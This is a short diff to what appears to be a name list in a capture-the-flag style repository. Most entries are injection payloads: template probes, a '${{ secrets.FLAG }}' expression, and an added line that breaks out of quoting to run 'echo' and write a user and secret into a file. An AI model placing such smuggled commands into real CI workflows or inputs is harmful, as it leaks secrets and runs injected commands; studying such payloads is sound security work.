@@ -59,3 +59,4 @@ pecof:{{ 1+1 }}
 mukeran:"
 user: "${{ secrets.FLAG }}
 karzanWang:"\echo 123"
+ZhaoQi99:asd}}" echo "$user:$flag" >> issues
